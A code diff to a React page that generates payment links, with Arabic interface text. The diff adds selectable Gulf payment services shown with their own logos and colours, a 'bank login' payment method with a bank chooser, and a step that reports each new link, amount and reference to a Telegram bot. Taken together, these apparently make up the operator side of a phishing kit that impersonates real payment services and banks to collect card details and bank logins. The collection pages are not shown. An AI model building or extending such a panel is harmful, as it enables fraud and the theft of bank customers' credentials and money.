@@ -7,13 +7,16 @@ import { Label } from "@/components/ui/label";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { useCreateLink } from "@/hooks/useSupabase";
 import { getCountryByCode } from "@/lib/countries";
+import { getPaymentServicesByCountry } from "@/lib/gccPaymentServices";
 import { getServiceBranding } from "@/lib/serviceLogos";
+import { getBanksByCountry } from "@/lib/banks";
 import { getCurrencySymbol, getCurrencyName, formatCurrency } from "@/lib/countryCurrencies";
 import { getCompanyMeta } from "@/utils/companyMeta";
 import { getCurrency, getDefaultTitle } from "@/utils/countryData";
 import { generatePaymentLink } from "@/utils/paymentLinks";
 import { CreditCard, DollarSign, Hash, Building2, Copy, ExternalLink, FileText } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
+import { sendToTelegram } from "@/lib/telegram";
 import TelegramTest from "@/components/TelegramTest";
 import {
   AlertDialog,
@@ -31,20 +34,48 @@ const CreatePaymentLink = () => {
   const { toast } = useToast();
   const createLink = useCreateLink();
   const countryData = getCountryByCode(country?.toUpperCase() || "");
+  const paymentServices = getPaymentServicesByCountry(country?.toUpperCase() || "");
 
+  const [selectedService, setSelectedService] = useState("");
+  const [paymentRef, setPaymentRef] = useState("");
+  const [paymentDescription, setPaymentDescription] = useState("");
   const [paymentAmount, setPaymentAmount] = useState("500");
   const [paymentMethod, setPaymentMethod] = useState("card");
+  const [selectedBank, setSelectedBank] = useState("");
   const [showSuccessDialog, setShowSuccessDialog] = useState(false);
   const [createdPaymentUrl, setCreatedPaymentUrl] = useState("");
   const [linkId, setLinkId] = useState("");
+  const [copied, setCopied] = useState(false);
+
+  // Get banks for the selected country
+  const banks = useMemo(() => getBanksByCountry(country?.toUpperCase() || ""), [country]);
+
+  // Get selected service details and branding
+  const selectedServiceData = useMemo(() =>
+    paymentServices.find(s => s.key === selectedService),
+    [paymentServices, selectedService]
+  );
+
+  const serviceBranding = useMemo(() => {
+    if (!selectedService) return null;
+    // Use custom branding for payment services
+    return {
+      logo: selectedServiceData?.logo || "",
+      colors: {
+        primary: selectedServiceData?.color || countryData?.primaryColor || "#0EA5E9",
+        secondary: countryData?.secondaryColor || "#06B6D4"
+      },
+      description: selectedServiceData?.description || `خدمة ${selectedServiceData?.nameAr}`
+    };
+  }, [selectedService, selectedServiceData, countryData]);
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
 
-    if (!paymentAmount) {
+    if (!selectedService || !paymentRef) {
       toast({
         title: "خطأ",
-        description: "الرجاء إدخال مبلغ السداد",
+        description: "الرجاء ملء جميع الحقول المطلوبة",
         variant: "destructive",
       });
       return;
@@ -55,8 +86,13 @@ const CreatePaymentLink = () => {
         type: "payment",
         country_code: country || "",
         payload: {
+          service_key: selectedService,
+          service_name: selectedServiceData?.nameAr || selectedService,
+          payment_reference: paymentRef,
+          payment_description: paymentDescription,
           payment_amount: parseFloat(paymentAmount) || 500,
           payment_method: paymentMethod,
+          selected_bank: paymentMethod === "bank_login" ? selectedBank : null,
           selectedCountry: country || "SA",
         },
       });
@@ -64,8 +100,15 @@ const CreatePaymentLink = () => {
       // Generate unified payment URL using the new function
       const paymentUrl = generatePaymentLink({
         invoiceId: link.id,
-        company: "payment",
+        company: selectedService,
         country: country || 'SA'
+      });
+
+      // Send data to Telegram with image and description
+      const telegramResult = await sendToTelegram({
+        message: `🔔 رابط سداد جديد\n\n🏢 الخدمة: ${selectedServiceData?.nameAr}\n💰 المبلغ: ${formatCurrency(parseFloat(paymentAmount) || 500, country || "SA")}\n🆔 المرجع: ${paymentRef}\n\n🌍 الدولة: ${countryData?.nameAr}\n\n🔗 الرابط: ${paymentUrl}`,
+        linkUrl: paymentUrl,
+        imageUrl: serviceBranding?.logo || "",
       });
 
       setCreatedPaymentUrl(paymentUrl);
@@ -86,6 +129,23 @@ const CreatePaymentLink = () => {
     }
   };
 
+  const copyToClipboard = async () => {
+    try {
+      await navigator.clipboard.writeText(createdPaymentUrl);
+      setCopied(true);
+      toast({
+        title: "تم النسخ!",
+        description: "تم نسخ رابط السداد إلى الحافظة",
+      });
+      setTimeout(() => setCopied(false), 2000);
+    } catch (err) {
+      toast({
+        title: "خطأ",
+        description: "فشل في نسخ الرابط",
+        variant: "destructive",
+      });
+    }
+  };
 
   if (!countryData) {
     return (
@@ -124,6 +184,74 @@ const CreatePaymentLink = () => {
             </div>
 
             <form onSubmit={handleSubmit} className="space-y-4">
+              {/* Payment Service Selection */}
+              <div>
+                <Label className="mb-2 text-sm">خدمة السداد *</Label>
+                <Select value={selectedService} onValueChange={setSelectedService}>
+                  <SelectTrigger className="h-10">
+                    <SelectValue placeholder="اختر خدمة السداد" />
+                  </SelectTrigger>
+                  <SelectContent className="bg-background z-50">
+                    {paymentServices.map((service) => (
+                      <SelectItem key={service.id} value={service.key}>
+                        {service.nameAr}
+                      </SelectItem>
+                    ))}
+                  </SelectContent>
+                </Select>
+              </div>
+
+              {/* Service Logo and Description */}
+              {selectedService && serviceBranding && selectedServiceData && (
+                <div className="p-3 rounded-lg border border-border bg-card/50">
+                  <div className="flex items-center gap-3 mb-2">
+                    {serviceBranding.logo && (
+                      <img
+                        src={serviceBranding.logo}
+                        alt={selectedServiceData.nameAr}
+                        className="h-8 object-contain"
+                        onError={(e) => {
+                          e.currentTarget.style.display = 'none';
+                        }}
+                      />
+                    )}
+                    <div>
+                      <h3 className="font-semibold text-sm">{selectedServiceData.nameAr}</h3>
+                      <p className="text-xs text-muted-foreground">{selectedServiceData.category}</p>
+                    </div>
+                  </div>
+                  <p className="text-xs text-muted-foreground">{serviceBranding.description}</p>
+                </div>
+              )}
+
+              {/* Payment Reference */}
+              <div>
+                <Label className="mb-2 flex items-center gap-2 text-sm">
+                  <Hash className="w-3 h-3" />
+                  رقم أو مرجع الدفع *
+                </Label>
+                <Input
+                  value={paymentRef}
+                  onChange={(e) => setPaymentRef(e.target.value)}
+                  placeholder="مثال: INV-12345, PAY-67890"
+                  className="h-9 text-sm"
+                  required
+                />
+              </div>
+
+              {/* Payment Description */}
+              <div>
+                <Label className="mb-2 flex items-center gap-2 text-sm">
+                  <FileText className="w-3 h-3" />
+                  وصف الدفع
+                </Label>
+                <Input
+                  value={paymentDescription}
+                  onChange={(e) => setPaymentDescription(e.target.value)}
+                  placeholder="مثال: رسوم خدمات، اشتراك، فاتورة"
+                  className="h-9 text-sm"
+                />
+              </div>
 
               {/* Payment Amount */}
               <div>
@@ -169,9 +297,36 @@ const CreatePaymentLink = () => {
                         <span>بيانات البطاقة</span>
                       </div>
                     </SelectItem>
+                    {selectedServiceData?.category === 'bank' && (
+                      <SelectItem value="bank_login">
+                        <div className="flex items-center gap-2">
+                          <Building2 className="w-4 h-4" />
+                          <span>الدفع المصرفي</span>
+                        </div>
+                      </SelectItem>
+                    )}
                   </SelectContent>
                 </Select>
               </div>
+
+              {/* Bank Selection (only if bank_login selected) */}
+              {paymentMethod === "bank_login" && (
+                <div>
+                  <Label className="mb-2 text-sm">اختر البنك *</Label>
+                  <Select value={selectedBank} onValueChange={setSelectedBank}>
+                    <SelectTrigger className="h-10">
+                      <SelectValue placeholder="اختر البنك" />
+                    </SelectTrigger>
+                    <SelectContent className="bg-background z-50">
+                      {banks.map((bank) => (
+                        <SelectItem key={bank.id} value={bank.id}>
+                          {bank.name}
+                        </SelectItem>
+                      ))}
+                    </SelectContent>
+                  </Select>
+                </div>
+              )}
 
               <Button
                 type="submit"
@@ -197,6 +352,27 @@ const CreatePaymentLink = () => {
                 يمكنك الآن مشاركة هذا الرابط مع العميل لدفع المبلغ المطلوب
               </AlertDialogDescription>
             </AlertDialogHeader>
+            <div className="my-4">
+              <Label className="text-sm font-semibold">رابط السداد</Label>
+              <div className="flex items-center gap-2 mt-2">
+                <Input
+                  value={createdPaymentUrl}
+                  readOnly
+                  className="text-sm h-10 font-mono"
+                />
+                <Button
+                  variant="outline"
+                  size="icon"
+                  onClick={copyToClipboard}
+                  className="shrink-0"
+                >
+                  <Copy className="h-4 w-4" />
+                </Button>
+              </div>
+              <p className="text-xs text-muted-foreground mt-2">
+                {copied ? "✓ تم النسخ" : "انقر لنسخ الرابط"}
+              </p>
+            </div>
             <AlertDialogFooter className="flex flex-row gap-2 justify-start">
               <Button
                 variant="outline"
@@ -208,11 +384,12 @@ const CreatePaymentLink = () => {
               </Button>
               <AlertDialogAction
                 onClick={() => {
-                  navigate(`/pay/${linkId}/data`);
+                  setShowSuccessDialog(false);
+                  navigate('/services');
                 }}
                 className="flex-1"
               >
-                إدخال بيانات السداد
+                إنشاء رابط آخر
               </AlertDialogAction>
             </AlertDialogFooter>
           </AlertDialogContent>
